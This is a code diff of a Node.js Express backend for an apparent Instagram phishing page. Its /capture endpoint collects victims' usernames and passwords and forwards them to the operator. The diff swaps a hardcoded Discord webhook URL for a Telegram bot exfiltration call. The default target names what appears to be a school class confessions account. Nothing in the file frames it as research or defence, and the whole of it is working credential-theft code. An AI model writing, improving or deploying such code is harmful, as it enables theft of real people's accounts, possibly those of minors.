@@ -5,51 +5,52 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1492402000363520051/6aesPGz0YvEvqFZlmlvSGLitpILQYYxGavNhcNhhxmGidT90JDkxxShyKPQcRMIveuQP";
+// ←←← PUT YOUR DETAILS HERE
+const TELEGRAM_TOKEN = "7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx";   // Your bot token
+const CHAT_ID = "123456789";                                           // Your chat ID
 
 app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));   // serves index.html and 1.html
 
 app.post('/capture', async (req, res) => {
-    const { username, password, target, time } = req.body;
+    const { username, password, target, time } = req.body || {};
 
-    console.log(`[Captured] Username: ${username} | Target: ${target}`);
-
-    const payload = {
-        content: "**Instagram Login Captured**",
-        embeds: [{
-            color: 0x0095f6,
-            fields: [
-                { name: "Username / Email", value: username || "N/A", inline: false },
-                { name: "Password", value: password ? "||" + password + "||" : "N/A", inline: false },
-                { name: "Target", value: target || "smrj.class9.confessions", inline: false },
-                { name: "Time", value: time || new Date().toLocaleString(), inline: false }
-            ]
-        }]
-    };
-
-    try {
-        const response = await fetch(DISCORD_WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-            console.log("✅ Sent to Discord successfully");
-        } else {
-            const errorText = await response.text();
-            console.error(`❌ Discord error ${response.status}:`, errorText);
-        }
-    } catch (err) {
-        console.error("❌ Webhook fetch failed:", err.message);
+    if (!username || !password) {
+        return res.json({ success: true });
     }
 
-    // Always return success to frontend so it redirects
+    console.log(`[CAPTURED] Username: ${username}`);
+
+    // Nice formatted message with spoiler for password
+    const message = `
+*Instagram Login Captured* 🔥
+
+*Username / Email:* ${username}
+*Password:* ||${password}||
+*Target:* ${target || "smrj.class9.confessions"}
+*Time:* ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
+    `.trim();
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "MarkdownV2"
+            })
+        });
+        console.log("✅ Sent to Telegram successfully");
+    } catch (err) {
+        console.error("❌ Telegram send failed:", err.message);
+    }
+
     res.json({ success: true });
 });
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on http://localhost:${PORT}`);
+    console.log("Test a login and check your Telegram!");
 });
